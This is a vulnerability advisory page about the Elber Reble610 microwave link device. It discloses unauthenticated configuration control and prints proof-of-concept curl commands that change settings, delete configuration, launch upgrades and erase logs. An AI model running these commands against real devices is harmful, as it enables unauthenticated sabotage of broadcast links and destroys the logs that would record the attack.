---
title: Elber Reble610 M/ODU XPIC IP-ASI-SDH Microwave Link Device Config Disclosure
url: https://cxsecurity.com/issue/WLB-2024050012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-05
fetch_date: 2025-10-06T17:13:49.952484
---

# Elber Reble610 M/ODU XPIC IP-ASI-SDH Microwave Link Device Config Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Elber Reble610 M/ODU XPIC IP-ASI-SDH Microwave Link Device Config Disclosure** **2024.05.04**  Credit:  **[Gjoko 'LiquidWorm' Krstic](https://cxsecurity.com/author/Gjoko%2B%26%23039%3BLiquidWorm%26%23039%3B%2BKrstic/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Elber Reble610 M/ODU XPIC IP-ASI-SDH Microwave Link Device Config
Vendor: Elber S.r.l.
Product web page: https://www.elber.it
Affected version: 0.01 Revision 0
Summary: The REBLE610 features an accurate hardware design, absence of
internal cabling and full modularity. The unit is composed by a basic
chassis with 4 extractable boards which makes maintenance and critical
operations, like frequency modification, easy and efficient. The modular
approach has brought to the development of the digital processing module
(containing modulator, demodulator and data interface) and the RF module
(containing Transmitter, Receiver and channel filters). From an RF point
of view, the new transmission circuitry is able to guarantee around 1 Watt
with every modulation scheme, introducing, in addition, wideband precorrection
(up to 1GHz depending on frequency band).
Desc: The device suffers from an unauthenticated device configuration and
client-side hidden functionality disclosure.
Tested on: NBFM Controller
embOS/IP
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2024-5819
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5819.php
18.08.2023
--
# Config fan
$ curl 'http://TARGET/json\_data/fan?fan\_speed=&fan\_target=&warn\_temp=&alarm\_temp='
Configuration applied
# Delete config
$ curl 'http://TARGET/json\_data/conf\_cmd?index=4&cmd=2'
File delete successfully
# Launch upgrade
$ curl 'http://TARGET/json\_data/conf\_cmd?index=4&cmd=1'
Upgrade launched Successfully
# Log erase
$ curl 'http://TARGET/json\_data/erase\_log.js?until=-2'
Logs erased
# Until:
# =0 ALL
# =-2 Yesterday
# =-8 Last week
# =-15 Last two weeks
# =-22 Last three weeks
# =-31 Last month
# Set RX config
$ curl 'http://TARGET/json\_data/NBFMV2RX.setConfig?freq=2480000&freq\_offset=0&mute=1&sq\_thresh=-90.0&dec\_mode=0&lr\_swap=0&preemph=0&preemph\_const=0&deemph=0&deemph\_const=1&ch\_lr\_enable=0&ch\_r\_gain=0.0&ch\_l\_gain=0.0&ch\_adj\_ctrl=0&ch\_lr\_att=1&mpxdig\_att=0&pilot\_trim=0.0&mpxdig\_gain=0.0&rds\_trim=0.0&delay\_enable=0&local\_rds=0&output\_delay=0&pi\_code=0\_\_\_&mpx1\_enable=1&mpx2\_enable=1&sca1\_enable=1&sca2\_enable=0&mpx1\_att=0&mpx2\_att=0&sca1\_att=0&sca2\_att=0&mpx1\_gain=0.0&mpx2\_gain=0.0&sca1\_gain=0.0&sca2\_gain=0.0&limiter\_enable=false&lim\_1\_gain=0.0+dB&lim\_1\_th=0.0+kHz&lim\_1\_alpha=0.0+%25&setupTime=0.0+ms&holdTime=0.0+ms&releaseFactor=0.0+dB%2Fsec&lim\_2\_en=false&lim\_2\_gain=0.0+dB&lim\_2\_th=0.0+kHz&rds\_gen=false&rt\_PI=&rt\_PS=&rt\_plus\_en=false&rt\_line\_A=&rt\_line\_B=&rt\_AF=&rf\_trap=0&output\_trap=0'
RX Config Applied Successfully
# Show factory window and FPGA upload (Console)
> cleber\_show\_factory\_wnd()
# Etc.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top